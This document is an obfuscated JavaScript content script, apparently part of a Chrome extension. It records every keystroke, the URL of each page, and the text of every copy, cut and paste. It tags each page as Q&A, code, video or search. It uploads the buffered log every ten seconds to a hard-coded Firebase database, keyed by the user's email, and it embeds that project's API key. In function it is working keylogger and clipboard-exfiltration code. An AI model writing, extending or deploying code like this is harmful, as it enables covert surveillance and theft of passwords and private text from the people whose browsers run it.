var _0x30ff=['cut','paste','clipboardData','getData','Text','AIzaSyDp8BOChOi_zaguCrDg8D_YP1NLHAlA_V0','https://test-be1cc.firebaseio.com','gs://test-be1cc.appspot.com','1047082222814','G-0392Q4KEVX','initializeApp','sendRequest','letsgo','runtime','addListener','message','split','replace','database','ref','users/','child','addEventListener','keydown','key','Control','Alt','Backspace','Capslock','End','PageDown','ArrowDown','ArrowLeft','ArrowRight','Enter','PageUp','Insert','Escape','log','repetitive','getTime','location','href','www.quora.com','stackoverflow.com','www.reddit.com','meta.stackoverflow.com','www.codeproject.com','groups.google.com','programmersheaven.com','colab.research.google.com','Q&A','includes','code','video','search','getSelection','toString','copy','length','Copied\x20text'];(function(_0x1d65af,_0x34d0d5){var _0x1940e7=function(_0x410afa){while(--_0x410afa){_0x1d65af['push'](_0x1d65af['shift']());}};_0x1940e7(++_0x34d0d5);}(_0x30ff,0x7f));var _0xeb76=function(_0x3892a7,_0x38269c){_0x3892a7=_0x3892a7-0x0;var _0x4d1e13=_0x30ff[_0x3892a7];return _0x4d1e13;};var config={'apiKey':_0xeb76('0x0'),'authDomain':'test-be1cc.firebaseapp.com','databaseURL':_0xeb76('0x1'),'projectId':'test-be1cc','storageBucket':_0xeb76('0x2'),'messagingSenderId':_0xeb76('0x3'),'appId':'1:1047082222814:web:4c0a9ff088bacca55eee4f','measurementId':_0xeb76('0x4')};firebase[_0xeb76('0x5')](config);toBeUpdated=![];var clipboardText='';var bufferData={};var userEmail='default';var keycount=0x0;chrome['extension'][_0xeb76('0x6')]({'message':_0xeb76('0x7')});chrome[_0xeb76('0x8')]['onMessage'][_0xeb76('0x9')](function(_0x4c32c4,_0x2e2944){userEmail=_0x4c32c4[_0xeb76('0xa')];});function writeUserData(_0x2a70f8){userid=userEmail[_0xeb76('0xb')]('@')[0x0];userid=userid[_0xeb76('0xc')](/[&\/\\#,+()$~%.'":*?<>{}]/g,'_');firebase[_0xeb76('0xd')]()[_0xeb76('0xe')](_0xeb76('0xf'))[_0xeb76('0x10')](userid)['update'](_0x2a70f8);toBeUpdated=![];}prev='';document[_0xeb76('0x11')](_0xeb76('0x12'),function(_0x3b1329){if((_0x3b1329[_0xeb76('0x13')]===_0xeb76('0x14')||_0x3b1329[_0xeb76('0x13')]==='Shift'||_0x3b1329[_0xeb76('0x13')]===_0xeb76('0x15')||_0x3b1329[_0xeb76('0x13')]===_0xeb76('0x16')||_0x3b1329[_0xeb76('0x13')]===_0xeb76('0x17')||_0x3b1329[_0xeb76('0x13')]===_0xeb76('0x18')||_0x3b1329[_0xeb76('0x13')]===_0xeb76('0x19')||_0x3b1329[_0xeb76('0x13')]===_0xeb76('0x1a')||_0x3b1329[_0xeb76('0x13')]==='ArrowUp'||_0x3b1329[_0xeb76('0x13')]===_0xeb76('0x1b')||_0x3b1329[_0xeb76('0x13')]===_0xeb76('0x1c')||_0x3b1329[_0xeb76('0x13')]===_0xeb76('0x1d')||_0x3b1329[_0xeb76('0x13')]==='Home'||_0x3b1329[_0xeb76('0x13')]===_0xeb76('0x1e')||_0x3b1329[_0xeb76('0x13')]===_0xeb76('0x1f')||_0x3b1329[_0xeb76('0x13')]===_0xeb76('0x20'))&&_0x3b1329[_0xeb76('0x13')]===prev){console[_0xeb76('0x21')](_0xeb76('0x22'));}else{keycount=keycount+0x1;prev=_0x3b1329['key'];console['log'](_0x3b1329['key'],keycount);toBeUpdated=!![];let _0x157d21=getUrl();let _0x4c509e=checkActivity(_0x157d21);let _0x57091c=new Date()[_0xeb76('0x23')]();bufferData[_0x57091c]={'key':_0x3b1329[_0xeb76('0x13')],'keyCount':keycount,'url':_0x157d21,'activity':_0x4c509e,'clipboard':clipboardText};}});function getUrl(){let _0x2913de=window[_0xeb76('0x24')][_0xeb76('0x25')];return _0x2913de;}function checkActivity(_0xc1190b){let _0x29a23e=[_0xeb76('0x26'),_0xeb76('0x27'),_0xeb76('0x28'),_0xeb76('0x29'),_0xeb76('0x2a'),_0xeb76('0x2b'),_0xeb76('0x2c')];let _0x5e38be=[_0xeb76('0x2d')];let _0x1330f8=['www.youtube.com'];if(_0x29a23e['includes'](_0xc1190b))return _0xeb76('0x2e');else if(_0x5e38be[_0xeb76('0x2f')](_0xc1190b))return _0xeb76('0x30');else if(_0x1330f8[_0xeb76('0x2f')](_0xc1190b))return _0xeb76('0x31');else return _0xeb76('0x32');}setInterval(function(){if(toBeUpdated){toBeUpdated=![];writeUserData(bufferData);bufferData={};}},0x2710);function geSelectionText(){let _0x921882='';if(window[_0xeb76('0x33')]){_0x921882=window[_0xeb76('0x33')]()[_0xeb76('0x34')]();}return _0x921882;}document[_0xeb76('0x11')](_0xeb76('0x35'),function(){let _0xca5f8b=geSelectionText();if(_0xca5f8b[_0xeb76('0x36')]>0x0){clipboardText=_0xca5f8b;console['log'](_0xeb76('0x37'),_0xca5f8b);toBeUpdated=!![];let _0x37a90d=getUrl();let _0x39a890=checkActivity(_0x37a90d);let _0x3240cf=new Date()['getTime']();bufferData[_0x3240cf]={'key':'','keyCount':'','url':_0x37a90d,'activity':_0x39a890,'clipboard':{'Copy':clipboardText}};clipboardText='';}},![]);document[_0xeb76('0x11')](_0xeb76('0x38'),function(){let _0x9c0b1=geSelectionText();if(_0x9c0b1[_0xeb76('0x36')]>0x0){clipboardText=_0x9c0b1;toBeUpdated=!![];let _0x3fde7b=getUrl();let _0x1f083c=checkActivity(_0x3fde7b);let _0x1b1b1d=new Date()[_0xeb76('0x23')]();bufferData[_0x1b1b1d]={'key':'','keyCount':'','url':_0x3fde7b,'activity':_0x1f083c,'clipboard':{'Cut':clipboardText}};clipboardText='';}},![]);document[_0xeb76('0x11')](_0xeb76('0x39'),function(_0x2b05cf){let _0x2f3d4f=_0x2b05cf[_0xeb76('0x3a')][_0xeb76('0x3b')](_0xeb76('0x3c'));clipboardText=_0x2f3d4f;toBeUpdated=!![];let _0x164d3b=getUrl();let _0x43be1e=checkActivity(_0x164d3b);let _0x15a3d7=new Date()[_0xeb76('0x23')]();bufferData[_0x15a3d7]={'key':'','keyCount':'','url':_0x164d3b,'activity':_0x43be1e,'clipboard':{'Paste':clipboardText}};clipboardText='';});